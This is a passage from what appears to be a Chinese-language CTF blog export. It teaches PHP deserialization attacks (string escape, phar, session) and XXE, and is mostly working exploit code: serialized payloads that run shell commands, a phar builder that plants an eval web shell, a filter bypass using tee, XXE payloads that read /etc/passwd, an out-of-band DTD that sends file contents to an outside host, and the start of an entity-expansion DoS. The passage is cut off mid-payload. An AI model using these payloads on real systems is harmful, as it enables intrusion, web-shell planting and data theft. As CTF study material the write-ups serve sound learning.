(waf(serialize($a)));\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:64:\"haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao\";s:1:\"b\";s:21:\"\";s:1:\"b\";s:3:\"888\";}\";}\";s:1:\"b\";s:3:\"888\";}'));\n//for($i=0;$i<17;$i++){\n//  echo 'good';\n//}\n?>\n运行结果：\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nobject(s)#2 (2) {\n  [\"a\"]=>\n  string(64) \"haohaohaohaohaohaohaohaohaohaohaohaohaohaohaohao\";s:1:\"b\";s:21:\"\"\n  [\"b\"]=>\n  string(3) \"888\"\n}\n888\";s:1:\"b\";s:3:\"888\";}\nProcess finished with exit code 0\n成功替换。\n```\n\n### 示例\n\n### 小试牛刀-----[NewStarCTF 2023 公开赛道]逃（增）\n\n```php\n <?php\nhighlight_file(__FILE__);s\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key;\n    public $cmd = \"whoami\";\n    public function __construct($key)\n    {\n        $this->key = $key;\n    }\n    public function __destruct()\n    {\n        system($this->cmd);\n    }\n}\n\nunserialize(waf(serialize(new GetFlag($_GET['key'])))); \n\n可以看到，每将一个bad替换成一个good，字符串长度+1，key是可控的\nO:7:\"GetFlag\":2:{s:3:\"key\";s:3:\"bad\";s:3:\"cmd\";s:6:\"whoami\";}这是传入一个bad的序列化的内容，现在我们不想执行whoami这个命令，就要把;s:3:\"cmd\";s:6:\"whoami\";}给顶出去。\n目的字符串：O:7:\"GetFlag\":2：{s:3:\"key\";s:3:\"bad\";s:3:\"cmd\";s:2:\"ls\";}\";s:3:\"cmd\";s:6:\"whoami\";}\n\";s:3:\"cmd\";s:2:\"ls\";}有22个字符，然后把22个bad替换掉后，就是增加了22个字符，那么ls就可以执行\n当前目录下没有，直接查根目录，原理一样\n?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:7:\"cat /f*\";}\n```\n\n## phar反序列化\n\n#### 什么是phar文件\n\nphar文件就是类似于java的jar的那种类型的压缩文件，它可以将多个php文件的代码压缩成一个phar，无需解压，PHP就可以进行访问并执行内部语句。\n\n#### phar文件结构\n\n```php\n1. stub //phar文件头\n    phar文件的标志，也可以理解为phar的文件头\n    这个Stub其实就是一个简单的PHP文件，必须是 xxx<?php xxx; __HALT_COMPILER();?> 这种格式，必须有__HALT_COMPILER()，没有这个，PHP就无法识别出它是Phar文件。其他的无所谓。\n2. manifest //压缩文件的信息\n    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这个meta-data就是用户自己定义的元数据，在这里用户自定义的元数据就是以序列化的形式存在的，这是漏洞利用最核心的地方。如下图。\n```\n\n![image-20240716105756715](C:\\Users\\杨沛欣\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240716105756715.png)\n\n```php\n3. content //压缩文件的内容\n    被压缩文件的内容\n4. signature (可空) //签名\n    签名，放在末尾。\n```\n\n#### phar反序列化\n\nPhar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的`meta-data`,PHP使用`phar_parse_metadata`在解析meta数据时，会调用`php_var_unserialize`进行反序列化操作。\n\n#### 利用条件\n\n```\n1、phar文件能够上传至服务器\n2、要有可控的参数，像元数据那种，并且、/、phar等特殊字符没有被过滤\n3、php.ini中的phar.readonly选项，需要为Off（默认是on）。\n```\n\n#### 生成phar文件\n\n```php\n<?php \nclass Flag{\n    public $cmd=\"qwq\";\n    function __destruct()\n    {\n        echo `cmd`;\n    }\n}\n\n$a = new Flag(); //创建一个flag的对象\n$phar = new Phar('A.phar'); //创建一个phar对象，这一行代码创建了一个新的 Phar 对象。Phar 是 PHP 中用于创建和操作 PHP 归档文件（PHAR 文件）的一个类。\n//功能：new Phar(\"phar.phar\")  文件名后缀必须是phar\n//参数：\"phar.phar\" 是正在创建或打开的 PHAR 文件的名称。如果该文件不存在，则会创建一个新的文件。\n$phar->startBuffering(); //开启缓存，在 Phar 对象上调用 startBuffering() 方法可以确保所有的更改在实际写入文件之前都会先被缓冲。这意味着在 stopBuffering() 之前的所有操作都不会立即生效，而是暂时存储在内存中。\n$phar->addFromString('test.txt','test'); //向 PHAR 文件中添加一个新的文件。addFromString 方法用于从字符串内容创建一个文件并将其添加到 PHAR 文件中。\"test.txt\" 是文件名，\"test\" 是文件内容。这一行代码并不是必须的。它的作用是向 PHAR 文件中添加一个名为 test.txt 的文件，并将其内容设置为 \"test\"。如果你不需要向 PHAR 文件中添加任何文件，这一行代码可以省略。\n$phar->setStub('<?php __HALT_COMPILER(); ? >'); //这一行代码设置了 PHAR 文件的存根（stub）。setStub 方法用于定义 PHAR 文件的入口代码。\"<?php __HALT_COMPILER(); ?>\" 是一个 PHP 指令，表示停止编译器。此代码在 PHAR 文件执行时首先运行。有时候会有文件头检测，如果有文件头检测可以加上文件头\n$phar->setMetadata($a);//设置元数据，setMetadata 方法用于给 PHAR 文件添加元数据。这里将 TestObject 对象 $a 作为元数据添加到 PHAR 文件中。\n//自动计算签名\n$phar->stopBuffering(); //这一行代码停止缓冲操作并将所有缓冲的更改写入 PHAR 文件。stopBuffering 方法会将之前缓冲的所有更改实际写入到 PHAR 文件中，使更改生效。\n```\n\n不过如果php.ini的phar.readonly处于on状态的话，是不允许生成phar文件的，cmd执行php --ini，就可以找到这个php.ini的文件路径，将php.ini里面的`phar.readonly`选项设置为`Off`。`并把分号去掉。`\n\n### 示例\n\n### 小试牛刀-----[NewStarCTF 2023 公开赛道]PharOne\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407160957424.png)\n\n查看源码，得到提示，/class.php\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161000091.png)\n\n访问看到\n\n```php\n <?php\nhighlight_file(__FILE__);\nclass Flag{\n    public $cmd;\n    public function __destruct()\n    {\n        @exec($this->cmd);\n    }\n}\n@unlink($_POST['file']); \n```\n\n那我们就联想到了，上传phar文件，phar协议输出，进行反序列化\n\n```php\n<?php\nclass Flag{\npublic $cmd;\npublic function __construct() {\n$this->cmd = \"echo '<?=eval(\\$_GET[1]);?>'>/var/www/html/1.php\";\n}\n\n}\n\n$a = new Flag(); //创建一个flag的对象\n$phar = new Phar('A.phar'); //创建一个phar对象，这一行代码创建了一个新的 Phar 对象。Phar 是 PHP 中用于创建和操作 PHP 归档文件（PHAR 文件）的一个类。\n//功能：new Phar(\"phar.phar\")  文件名后缀必须是phar\n//参数：\"phar.phar\" 是正在创建或打开的 PHAR 文件的名称。如果该文件不存在，则会创建一个新的文件。\n$phar->startBuffering(); //开启缓存，在 Phar 对象上调用 startBuffering() 方法可以确保所有的更改在实际写入文件之前都会先被缓冲。这意味着在 stopBuffering() 之前的所有操作都不会立即生效，而是暂时存储在内存中。\n$phar->addFromString('test.txt','test'); //向 PHAR 文件中添加一个新的文件。addFromString 方法用于从字符串内容创建一个文件并将其添加到 PHAR 文件中。\"test.txt\" 是文件名，\"test\" 是文件内容。这一行代码并不是必须的。它的作用是向 PHAR 文件中添加一个名为 test.txt 的文件，并将其内容设置为 \"test\"。如果你不需要向 PHAR 文件中添加任何文件，这一行代码可以省略。\n$phar->setStub('<?php __HALT_COMPILER(); ? >'); //这一行代码设置了 PHAR 文件的存根（stub）。setStub 方法用于定义 PHAR 文件的入口代码。\"<?php __HALT_COMPILER(); ?>\" 是一个 PHP 指令，表示停止编译器。此代码在 PHAR 文件执行时首先运行。有时候会有文件头检测，如果有文件头检测可以加上文件头\n$phar->setMetadata($a);//设置元数据，setMetadata 方法用于给 PHAR 文件添加元数据。这里将 TestObject 对象 $a 作为元数据添加到 PHAR 文件中。\n//自动计算签名\n$phar->stopBuffering(); //这一行代码停止缓冲操作并将所有缓冲的更改写入 PHAR 文件。stopBuffering 方法会将之前缓冲的所有更改实际写入到 PHAR 文件中，使更改生效。\n?>\n```\n\n对__HALT_COMPILER()有过滤，所以通过gzip命令绕过，因为只能上传图片，所以修改后缀为.png\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161036193.png)\n\n上传aa.png\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161039957.png)\n\n在class.php下phar读取，进行反序列化\n\n```php\nfile=phar:///var/www/html/upload/321532365639f31b3b9f8ea8be0c6be2.png \n```\n\n访问/1.php，GET传参执行命令\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161043057.png)\n\n## SESSION的概念\n\n`Session`一般称为“会话控制“，简单来说就是是一种客户与网站/服务器更为安全的对话方式。一旦开启了 `session` 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。因为HTTP协议是无状态的，那如何辨别“你是你”呢，那就用到了session，通过cookie中的session来进行用户追踪。\n\n## SESSION的工作原理\n\n当我们开启一个session会话时，首先php会先查找session_id，如果在请求的cookie中，服务器没有在GET或者POST请求方式中找到session_id，那么这个时候php就会调用php_session_create_id函数来创建一个新的会话，在http-response中通过set-cookie头部发送给客户端，session在客户端保存。\n\n**session_start()函数**\n\n上面说了session的创建，那么下面我们就要说一下session的创建过程，我们先来看一下session_statrt()这个函数，这个函数的作用是开启会话，初始化session数据\n\n```php\nSeesion_start()函数会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161517719.png)\n\n## SESSION的存储机制\n\n写一个测试代码：\n\n```php\n<?php\nhighlight_file(__FILE__);\nsession_start();\necho \"session_id(): \".session_id().\"<br>\";\necho \"COOKIE: \".$_COOKIE[\"PHPSESSID\"];\n\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161531721.png)\n\n可以看到生成了一个session\n\n我们查看一下文件夹，一般都在是存储在tmp/里面\n\n```\n/var/lib/php5/sess_PHPSESSID\n/var/lib/php7/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSED\nliunx常见保存位置\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161533665.png)\n\n最后一个就是我们刚创建的session了\n\n我们给session赋值看看\n\n```php\n<?php\nhighlight_file(__FILE__);\nsession_start();\n$_SESSION['test1']='hello';\n$_SESSION['test2']='world';\necho '\\n';\necho \"session_id(): \" . session_id() . \"<br>\";\necho \"COOKIE: \" . $_COOKIE[\"PHPSESSID\"];\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161544088.png)\n\n可以看到数据是以序列化的状态存储在文件中的\n\n那就是HTTP请求一个页面后，如果用到开启session，会去读COOKIE中的PHPSESSID是否有，如果没有，则会新生成一个session_id，先存入COOKIE中的PHPSESSID中，再生成一个sess_前缀文件。当有写入$_SESSION的时候，就会往sess_文件里序列化写入数据。当读取到session变量的时候，先会读取COOKIE中的PHPSESSID，获得session_id，然后再去找这个sess_session_id文件，来获取对应的数据。由于默认的PHPSESSID是临时的会话，在浏览器关闭后就会消失，所以，当我们打开浏览器重新访问的时候，就会新生成session_id和sess_session_id这个文件。\n\n## SESSION模块的参数含义\n\n|          **Directive**          |                      **含义**                      |\n| :-----------------------------: | :------------------------------------------------: |\n|      session.save_handler       |            session保存形式。默认为files            |\n|        session.save_path        |                 session保存路径。                  |\n|    session.serialize_handler    |      session序列化存储所用处理器。默认为php。      |\n| session.upload_progress.cleanup | 一旦读取了所有POST数据，立即清除进度信息。默认开启 |\n| session.upload_progress.enabled |   将上传文件的进度信息存在session中。默认开启。    |\n\n主要有三种处理器\n\n当 **session.serialize_handler=php** 时，session文件内容为： `name|s:7:\"mochazz\";`\n\n当 **session.serialize_handler=php_serialize** 时，session文件为： `a:1:{s:4:\"name\";s:7:\"mochazz\";}`\n\n当 **session.serialize_handler=php_binary** 时，session文件内容为： `二进制字符names:7:\"mochazz\";`\n\n可以用ini_set来改变处理器\n\n```php\n<?php\nini_set('session.serialize_handler','php_binary');\nsession_start();\n$_SESSION['name'] = $_GET['name'];\necho $_SESSION['name'];\n?>\n\n```\n\n当 [session.upload_progress.enabled](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled) INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。\n\n当一个上传在处理中，同时POST一个与INI中设置的[session.upload_progress.name](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name)同名变量时，上传进度可以在[$_SESSION](http://php.net/manual/zh/reserved.variables.session.php)中获得。 当PHP检测到这种POST请求时，它会在[$_SESSION](http://php.net/manual/zh/reserved.variables.session.php)中添加一组数据, 索引是[session.upload_progress.prefix](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix) 与 [session.upload_progress.name](http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name)连接在一起的值。\n\n## SESSION的反序列化\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161556577.png)\n\n这也就是SESSION反序列化的切入点了，我们可以直接通过写入SESSION文件，然后请求页面，让php自行将我们的序列化字符串进行反序列化，但是因为我们传入的是键值对，那么`session`序列化存储所用的处理器肯定也是将这个键值对写了进去，怎么才能让它正好反序列化到我们传入的内容。\n\n这里就要用到我们上面介绍到的不同序列化处理器的特性，我们可以在我们传入的序列化内容前面加一个|,在php_serialize处理后会返回一个序列化后的数组，但是在使用php处理器会以竖线|作为一个分隔符，前面的为键名，后面的为键值，然后将键值进行反序列化操作，这样就能够实现我们session反序列化操作。\n\n### 示例\n\n```php\n<?php\nhighlight_file(__FILE__);\nini_set('session.serialize_handler', 'php');\n\nclass Test{\n    public $code;\n    function __destruct(){\n        eval($this->code);\n    }\n}\n\nsession_start();\nif (isset($_GET['test'])) {\n    $_SESSION['test'] = $_GET['test'];\n}\n?>\n?test=|O:4:\"Test\":1:{s:4:\"code\";s:10:\"phpinfo();\";}\n```\n\n### 小试牛刀----[安洵杯 2019]easy_serialize_php（session反序列化+减逃逸）\n\n```php\n<?php\n\n$function = @$_GET['f'];\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\nextract($_POST);\n\nif(!$function){\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\n}\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n$serialize_info = filter(serialize($_SESSION));\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n} \n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161622229.png)\n\n传入phpinfo看一下\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161724600.png)\n\n可以看到，反序列化处理器是php，文件提示，d0g3_f1ag.php\n\n那么看代码可以知道，我们的目的是执行`file_get_contents(base64_decode($userinfo['img']))`这个函数，并且一看就知道还是字符串减少的字符串逃逸\n\n```php\n看代码，需要满足f=show_image,让字符串逃逸\n原始字符串为\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n$_SESSION['img'] = base64_encode('guest_img.png');\n序列化一下看看\n<?php\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = 'show_image';\n$_SESSION['img'] = base64_encode('guest_img.png');\necho serialize($_SESSION);\na:3：{s:4:\"user\";s:5:\"guest\";s:8:\"function\";s:10:\"show_image\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\n现在要把img给弄成ZDBnM19mMWFnLnBocA==（d0g3_flag.php的base64编码）\n从user下手，把guest\";s:8:\"function\";s:10:\"show_image给吞掉，然后自己再造个键值对\n即\n<?php\n$_SESSION[\"user\"] = 'flagflagflagflagflagflag';\n$_SESSION['function'] = 'a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:20:\"ZDBnM19mMWFnLnBocA==\";}';\n$_SESSION['dd'] = base64_encode('d0g3_f1ag.php');\necho serialize($_SESSION);\na:3:{s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:79:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:2:\"dd\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\n\n```\n\n\n\n## 参考文章：\n\n[带你走进PHP session反序列化漏洞](https://xz.aliyun.com/t/6640?time__1311=n4%2BxnD0Dg7%3DYqBK0QD%2FiW4nrBeIe0K%3DQx)\n\n[session反序列化](https://www.cnblogs.com/GTL-JU/p/16859098.html)\n\n[PHP反序列化入门之phar](https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#%E4%BE%8B%E9%A2%98%E4%B8%80)\n\n[PHP Phar反序列化学习](https://www.cnblogs.com/CoLo/p/16786627.html)\n\n[Phar反序列化总结](https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)\n\n[PHP反序列化 — 字符逃逸](https://xz.aliyun.com/t/9213?time__1311=n4%2BxnD0DuAG%3DoxGqGNnmDUxYqxEkDcAA2xmupD)\n\n[通过CTF题目学习反序列化字符串逃逸](https://xz.aliyun.com/t/9895?time__1311=n4%2BxnD0DuDRD9B7NDsAoxCqw0r7ei%3D37tH4D)\n\n[干货 | 能看懂的PHP反序列化字符逃逸漏洞](https://cloud.tencent.com/developer/article/2226541)\n\n[PHP反序列化入门之session反序列化](https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)","tags":["-php反序列化 -session反序列化 -phar反序列化 -php pop链 -php字符串逃逸"]},{"title":"[NewStarCTF 2023 公开赛道]RCE-无回显RCE","url":"/2024/07/11/NewStarCTF-2023-公开赛道-RCE-无回显RCE/","content":"\n# [NewStarCTF 2023 公开赛道]R!!!C!!!E!!!\n\n这道题是反序列化+无回显RCE\n\n关键点：[tee命令](https://blog.csdn.net/G_D0120/article/details/136567416)\n\n```php\n <?php\nhighlight_file(__FILE__);\nclass minipop{\n    public $code;\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\nif(isset($_POST['payload'])){\n    //wanna try?\n    unserialize($_POST['payload']);\n} \n```\n\n源码如上，一眼就是反序列化，直接构造\n\n```php\n<?php\nclass minipop{\n    public $code=\"ls\";\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\n$m=new minipop(); //创建对象\n$m->qwejaskdjnlka=new minipop();  //触发__toString()\necho serialize($m);  //序列化对象\n?>\n```\n\n但是当我交上去的时候发现没有回应\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111110617.png)\n\n一直以为是没有执行成功，后来经过大佬指点才知道是**无回显**，那么无回显RCE该怎么利用呢，就是把执行结果输出到一个文件里，然后访问这个文件就可以了\n\n```php\n<?php\nclass minipop{\n    public $code=\"ls /|t''ee 1\"; //tee命令输出到 1 文件，用''绕过\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\n$m=new minipop();\n$m->qwejaskdjnlka=new minipop();\necho serialize($m);\n?>\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111116995.png)\n\n然后执行cat /flag_is_h3eeere|t''ee 1命令，直接读取flag\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407111120971.png)","tags":["-RCE -反序列化"]},{"title":"XXE外部注入实体漏洞_php","url":"/2024/07/10/XXE外部注入实体漏洞-php/","content":"\n# XXE外部实体漏洞\n\n## XML和DTD\n\n### XML与HTML的区别\n\nXML是被设计为传输和存储数据，其焦点是数据的内容\n\nHTML被设计用来显示数据，其焦点是数据的外观\n\nHTML主要是显示信息，而XML主要传输信息\n\n所以，如果不严谨的话，就会造成XML去传输一些恶意的信息\n\n### 漏洞成因\n\nXXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置（就是有上传xml文件的入口点），没有对上传的xml文件进行过滤，导致可上传恶意xml文件。\n\n### XML的格式\n\n```dtd\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> //声明XML文档\n\n<!DOCTYPE note [\n  <!ELEMENT note (to,from,heading,body)>\n  <!ELEMENT to      (#PCDATA)>\t\t\t\t\n  <!ELEMENT from    (#PCDATA)>\t\t\t\t//DTD文档定义类型\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body    (#PCDATA)>\n]>\n\n<note>\n<to>George</to>\n<from>John</from>\t\t\t\t\t\t\t//文档元素，元素是自由设定的。\n<heading>Reminder</heading> \t\t\t\t//但是一定要有根元素和分支，并且正确嵌套\n<body>Don't forget the meeting!</body>\n</note>\n\n```\n\n### DTD（文档定义类型）-实体\n\n**实体是用于定义引用普通文本或特殊字符的快捷方式的变量。**\n\n**实体引用是对实体的引用。**\n\n**实体可在内部或外部进行声明。**\n\n##### 作用是定义XML文档的合法构建模块，可内部声明，也可外部引用，这个也是外部实体注入的关键地方\n\n#### 内部实体的声明\n\n```dtd\n语法：\n<!ENTITY 实体名称 \"实体的值\">\n\nDTD中：\n例子：\n<!ENTITY writer \"Bill Gates\">\n<!ENTITY copyright \"Copyright W3School.com.cn\">\n\nXML中：\n一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。\n例子;\n<author>&writer;&copyright;</author>\n```\n\n#### 外部实体声明\n\n```dtd\n语法:\n<!ENTITY 实体名称 SYSTEM \"URI/URL\">\n\nDTD中：\n例子：\n<!ENTITY writer SYSTEM \"http://www.baidu.com.cn/dtd/entities.dtd\">\n<!ENTITY copyright SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\">\n\nXML中：\n例子：\n<author>&writer;&copyright;</author>\n\n或者\n<!ENTITY 实体名称 PUBLIC \"public_ID\" \"URI\">\n```\n\n### XML外部实体注入\n\n当允许引用外部实体时，由于XML注重于数据的传输，所以通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。\n\n#### 方式1:\n\n#### 通过协议来引用，不过不同的程序支持的协议不一样\n\n#### ![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091426966.png)\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE test[\n    <!ENTITY Y SYSTEM \"file:///etc/passwd\">\n    ]>\n<user>&Y</user>\n//上传该文件就会返回/etc/passwd的内容\n```\n\n#### 方式2：\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE test[\n    <!ENTITY Y SYSTEM \"http://www.baidu.com\">\n    ]>\n<user>&Y</user>\n```\n\n#### 方式3（数据外带---在xxe的盲注中可以使用）：\n\n```xml-dtd\n<!DOCTYPE root [   \n<!ENTITY % remote SYSTEM \"http://174.1.66.167/shell.dtd\">  \n%remote;  \n]>  \n  \nshell.dtd  \n<!ENTITY % file SYSTEM \"file:///flag\">  \n<!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://127.0.0.1:5555/?flag=%file;'>\">  \n%int;  \n%send;\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091658763.png)\n\n#### 方式4（内部DTD+参数外部实体）：\n\n```xml-dtd\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE a[\n<!ENTITY %name SYSTEM \"file:///etc/passwd\">\n%name;\n]>\n//注意：%name（参数实体）是在 DTD 中被引用的，而&name（其余实体）实在 xml 文档中被引用\n的。\n```\n\n#### 绕过手法\n\n```xml-dtd\n双重实体编码绕过\n<?xml version=\"1.0\"?>  \n  \n<!DOCTYPE GVI [  \n  \n    <!ENTITY % xml \"&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#102;&#108;&#97;&#103;&#46;&#116;&#120;&#116;&#34;&#32;&#62;&#93;&#62;&#10;&#60;&#99;&#111;&#114;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#38;&#120;&#120;&#101;&#59;&#60;&#47;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#10;&#60;&#47;&#99;&#111;&#114;&#101;&#62;\">  \n  \n    %xml;\n\n编码内容:\n<!ENTITY xxe SYSTEM \"file:///flag.txt\" >]>  \n<core>  \n      <message>&xxe;</message>  \n</core>\n```\n\n#### 拒绝服务攻击代码\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [ \n<!ENTITY lol \"lol\"> \n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"> \n<!ENTITY lol3 